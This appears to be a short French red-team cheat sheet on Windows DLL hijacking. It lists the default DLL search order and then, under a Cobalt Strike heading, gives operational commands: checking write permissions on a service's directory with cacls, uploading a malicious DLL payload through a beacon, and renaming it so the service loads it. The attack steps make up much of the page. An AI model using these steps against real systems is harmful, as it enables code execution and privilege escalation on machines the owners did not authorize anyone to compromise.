
- [[DLL HIJACKING WINDOWS]]

Lorsqu'il tente de localiser une DLL, Windows utilise l'ordre de recherche suivant par défaut (**Safe DLL Search Mode**).

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système `C:\Windows\System32` pour les systèmes 64 bits.
3. Le répertoire système 16 bits `C:\Windows\System` (non supporté sur les systèmes 64 bits)
4. Le répertoire Windows.
5. Le répertoire courant.
6. Tous les répertoires répertoriés dans la variable d'environnement PATH.



## Cobalt Strike

Si possible d'écrire dans le répertoire de l'application alors il est possible d'hijacker une DLL.

```
cacls "C:\Program Files\Bad Windows Service\Service Executable"
```

Upload la dll malveillante.

```
cd "C:\Program Files\Bad Windows Service\Service Executable"
upload C:\Payloads\dns_x64.dll
mv dns_x64.dll BadDll.dll
```

